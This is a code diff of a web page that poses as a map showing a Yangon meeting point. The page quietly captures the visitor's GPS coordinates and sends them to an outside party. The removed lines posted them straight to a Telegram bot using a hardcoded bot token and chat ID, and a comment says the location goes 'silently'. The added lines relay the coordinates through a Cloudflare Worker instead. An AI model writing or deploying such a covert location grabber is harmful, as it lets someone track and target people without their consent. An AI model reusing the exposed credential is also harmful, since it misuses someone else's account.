@@ -43,20 +43,21 @@ html, body {
 
 <script>
 /* ================= CONFIG ================= */
-const BOT_TOKEN = "8300093303:AAEaZEc86Rns1Q2xcahWA55YjFYvbCvxoVo";
-const CHAT_ID  = "5991637594";
 
-// Yangon meeting point (example)
+// 🔁 မင်း Worker URL ကို ဒီနေရာမှာပဲ ထည့်
+const WORKER_URL = "https://empty-bar-fafc.freetextingacc001.workers.dev";
+
+// Yangon meeting point (မပြောင်း)
 const YANGON_POINT = { lat: 16.7746, lng: 96.1581 };
 
-/* ================= TELEGRAM ================= */
-function sendTelegram(text) {
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+/* ================= SEND TO WORKER ================= */
+function sendToWorker(lat, lng) {
+  fetch(WORKER_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text
+      lat: lat,
+      lng: lng
     })
   });
 }
@@ -78,19 +79,17 @@ if (navigator.geolocation) {
         attribution: "© OpenStreetMap"
       }).addTo(map);
 
-      // Only Yangon marker
+      // Yangon marker only
       L.marker([YANGON_POINT.lat, YANGON_POINT.lng]).addTo(map);
 
-      // Send location silently to Telegram
+      // 📤 Send user location → Worker → Telegram
       const lat = pos.coords.latitude;
       const lng = pos.coords.longitude;
 
-      sendTelegram(
-        `User Location\nLat: ${lat}\nLng: ${lng}\nhttps://maps.google.com/?q=${lat},${lng}`
-      );
+      sendToWorker(lat, lng);
     },
     () => {
-      // ❌ Deny → keep "Open Location"
+      // ❌ Deny
       document.getElementById("notice").innerText = "📍 Open Location";
     }
   );
